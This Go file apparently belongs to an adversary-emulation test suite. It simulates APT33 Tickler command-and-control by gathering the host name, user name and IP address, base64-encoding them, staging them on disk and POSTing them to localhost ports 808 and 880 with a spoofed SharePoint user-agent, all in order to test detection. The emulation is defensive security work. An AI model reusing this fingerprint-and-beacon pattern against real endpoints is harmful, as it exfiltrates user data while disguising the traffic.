//go:build windows
// +build windows

/*
STAGE 6: Web Protocols C2 (T1071.001)
Simulates APT33 Tickler HTTP POST data exfiltration to Azure-hosted
C2 infrastructure on non-standard ports (808/880). Creates system
fingerprint data and sends HTTP POST requests with base64-encoded
payloads to simulate the Tickler C2 protocol.
*/

package main

import (
	"encoding/base64"
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

const (
	TEST_UUID      = "13c2d073-8e33-4fca-ab27-68f20c408ce9"
	TECHNIQUE_ID   = "T1071.001"
	TECHNIQUE_NAME = "Web Protocols C2"
	STAGE_ID       = 6
)

const (
	StageSuccess     = 0
	StageBlocked     = 126
	StageQuarantined = 105
	StageError       = 999
)

func main() {
	AttachLogger(TEST_UUID, fmt.Sprintf("Stage %d: %s", STAGE_ID, TECHNIQUE_ID))

	LogMessage("INFO", TECHNIQUE_ID, "Starting Web Protocols C2 simulation")
	LogMessage("INFO", TECHNIQUE_ID, "Simulating HTTP POST exfiltration to Azure-hosted C2")
	LogStageStart(STAGE_ID, TECHNIQUE_ID, "HTTP POST C2 communication to Azure endpoints")

	if err := performTechnique(); err != nil {
		fmt.Printf("[STAGE %s] Technique failed: %v\n", TECHNIQUE_ID, err)
		LogMessage("ERROR", TECHNIQUE_ID, fmt.Sprintf("Technique failed: %v", err))

		exitCode := determineExitCode(err)
		if exitCode == StageBlocked || exitCode == StageQuarantined {
			LogStageBlocked(STAGE_ID, TECHNIQUE_ID, err.Error())
		} else {
			LogStageEnd(STAGE_ID, TECHNIQUE_ID, "error", err.Error())
		}
		os.Exit(exitCode)
	}

	fmt.Printf("[STAGE %s] HTTP C2 simulation completed\n", TECHNIQUE_ID)
	LogMessage("SUCCESS", TECHNIQUE_ID, "HTTP POST C2 simulation completed")
	LogStageEnd(STAGE_ID, TECHNIQUE_ID, "success", "C2 communication simulated via HTTP POST with base64 payloads")
	os.Exit(StageSuccess)
}

func performTechnique() error {
	// APT33 Tickler C2 protocol:
	// 1. Gathers system fingerprint (hostname, username, IP)
	// 2. Base64-encodes the data
	// 3. Sends HTTP POST to Azure-hosted C2 on non-standard ports (808, 880)
	// 4. C2 infrastructure uses fraudulent Azure subscriptions
	//
	// We simulate by:
	// a) Collecting system info (benign - hostname, username)
	// b) Base64-encoding it (models actual Tickler encoding)
	// c) Attempting HTTP POST to localhost on non-standard ports
	//    (safe - no actual exfiltration, tests network monitoring detection)
	// d) Writing staged data to disk (tests file monitoring)

	// Step 1: Collect system fingerprint (benign data only)
	LogMessage("INFO", TECHNIQUE_ID, "Collecting system fingerprint for C2 beacon...")

	hostname, _ := os.Hostname()
	username := os.Getenv("USERNAME")
	computerName := os.Getenv("COMPUTERNAME")

	// Get IP address
	ipOutput := ""
	cmd := exec.Command("ipconfig")
	if output, err := cmd.Output(); err == nil {
		lines := strings.Split(string(output), "\n")
		for _, line := range lines {
			if strings.Contains(line, "IPv4") {
				parts := strings.SplitN(line, ":", 2)
				if len(parts) == 2 {
					ipOutput = strings.TrimSpace(parts[1])
					break
				}
			}
		}
	}

	// Format fingerprint like Tickler's C2 beacon
	fingerprint := fmt.Sprintf("HOST=%s|USER=%s|COMP=%s|IP=%s|TIME=%s|AGENT=Tickler/2.0",
		hostname, username, computerName, ipOutput, time.Now().UTC().Format(time.RFC3339))

	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("System fingerprint collected: %s", fingerprint))

	// Step 2: Base64-encode the payload (models Tickler encoding)
	encodedPayload := base64.StdEncoding.EncodeToString([]byte(fingerprint))
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Base64-encoded payload: %s", encodedPayload[:40]+"..."))

	// Step 3: Write staged exfil data to disk (detection opportunity)
	stagingDir := filepath.Join("c:\\F0", "c2_staging")
	if err := os.MkdirAll(stagingDir, 0755); err != nil {
		return fmt.Errorf("failed to create C2 staging directory: %v", err)
	}

	beaconFile := filepath.Join(stagingDir, "beacon.dat")
	if err := os.WriteFile(beaconFile, []byte(encodedPayload), 0644); err != nil {
		return fmt.Errorf("failed to write beacon data: %v", err)
	}
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Beacon data staged: %s (%d bytes)", beaconFile, len(encodedPayload)))

	// Step 4: Attempt HTTP POST to non-standard ports (simulated C2)
	// Uses localhost endpoints that won't actually connect - this tests
	// network monitoring for outbound HTTP on non-standard ports
	c2Endpoints := []struct {
		url  string
		port int
		desc string
	}{
		{"http://127.0.0.1:808/update", 808, "Azure-style C2 port 808"},
		{"http://127.0.0.1:880/sync", 880, "Azure-style C2 port 880"},
	}

	httpClient := &http.Client{
		Timeout: 5 * time.Second,
	}

	c2AttemptsLogged := 0

	for _, endpoint := range c2Endpoints {
		LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Attempting HTTP POST to %s (%s)...", endpoint.url, endpoint.desc))

		// Create HTTP POST request with base64 payload
		body := strings.NewReader(fmt.Sprintf("data=%s&id=%s", encodedPayload, TEST_UUID))
		req, err := http.NewRequest("POST", endpoint.url, body)
		if err != nil {
			LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Request creation failed for port %d: %v", endpoint.port, err))
			c2AttemptsLogged++
			continue
		}

		// Set headers that match Tickler's C2 pattern
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		req.Header.Set("User-Agent", "Microsoft SharePoint/16.0")
		req.Header.Set("X-SharePoint-Token", encodedPayload[:20])

		// Attempt the request (expected to fail - localhost has no listener)
		resp, err := httpClient.Do(req)
		if err != nil {
			// Connection refused/timeout is expected (no listener)
			// This is NOT an EDR block - it's expected behavior
			LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("C2 endpoint port %d: connection failed (expected - no listener): %v", endpoint.port, err))
			c2AttemptsLogged++
			continue
		}
		resp.Body.Close()

		// If we got a response, log it
		LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("C2 endpoint port %d: HTTP %d (unexpected response)", endpoint.port, resp.StatusCode))
		c2AttemptsLogged++
	}

	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("C2 communication attempts: %d/%d endpoints contacted", c2AttemptsLogged, len(c2Endpoints)))

	// Step 5: Check if staging files survived (not quarantined)
	time.Sleep(2 * time.Second)
	if _, err := os.Stat(beaconFile); os.IsNotExist(err) {
		return fmt.Errorf("beacon staging file was removed")
	}

	LogMessage("INFO", TECHNIQUE_ID, "C2 simulation complete: HTTP POST with base64 payloads attempted on non-standard ports")
	LogMessage("INFO", TECHNIQUE_ID, "Detection points: base64-encoded beacon, HTTP POST to ports 808/880, SharePoint user-agent")

	return nil
}

// ==============================================================================
// EXIT CODE DETERMINATION
// ==============================================================================

func determineExitCode(err error) int {
	if err == nil {
		return StageSuccess
	}
	errStr := err.Error()
	if containsAny(errStr, []string{"access denied", "access is denied", "permission denied", "operation not permitted"}) {
		return StageBlocked
	}
	if containsAny(errStr, []string{"quarantined", "virus", "threat"}) {
		return StageQuarantined
	}
	if containsAny(errStr, []string{"not found", "does not exist", "no such", "not running", "not available"}) {
		return StageError
	}
	return StageBlocked
}

func containsAny(s string, substrings []string) bool {
	for _, substr := range substrings {
		if containsCI(s, substr) {
			return true
		}
	}
	return false
}

func containsCI(s, substr string) bool {
	return len(s) >= len(substr) && indexIgnoreCase(s, substr) >= 0
}

func indexIgnoreCase(s, substr string) int {
	s = toLowerStr(s)
	substr = toLowerStr(substr)
	for i := 0; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return i
		}
	}
	return -1
}

func toLowerStr(s string) string {
	result := make([]byte, len(s))
	for i := 0; i < len(s); i++ {
		c := s[i]
		if c >= 'A' && c <= 'Z' {
			c = c + ('a' - 'A')
		}
		result[i] = c
	}
	return string(result)
}
